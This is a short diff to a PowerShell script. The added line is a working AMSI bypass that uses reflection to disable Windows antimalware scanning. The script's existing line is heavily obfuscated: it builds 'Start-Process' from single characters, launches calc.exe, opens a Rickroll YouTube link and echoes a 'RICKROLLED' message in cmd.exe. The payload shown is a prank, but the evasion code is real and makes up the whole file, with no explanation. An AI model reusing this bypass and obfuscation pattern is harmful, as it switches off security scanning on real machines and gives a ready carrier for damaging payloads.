@@ -1,1 +1,2 @@
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)
 ${a}='S'+'t'+'a'+'r'+'t'+'-'+'P'+'r'+'o'+'c'+'e'+'s'+'s';.&${a} c`a`l`c`.`e`x`e;.&${a} 'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'w'+'w'+'w'+'.'+'y'+'o'+'u'+'t'+'u'+'b'+'e'+'.'+'c'+'o'+'m'+'/'+'w'+'a'+'t'+'c'+'h'+'?'+'v'+'='+'d'+'Q'+'w'+'4'+'w'+'9'+'W'+'g'+'X'+'c'+'Q';.&${a} c`m`d`.`e`x`e -A`r`g`u`m`e`n`t`L`i`s`t '/k','e'+'c'+'h'+'o','Y'+'O'+'U'+"'"+'V'+'E','B'+'E'+'E'+'N','R'+'I'+'C'+'K'+'R'+'O'+'L'+'L'+'E'+'D'
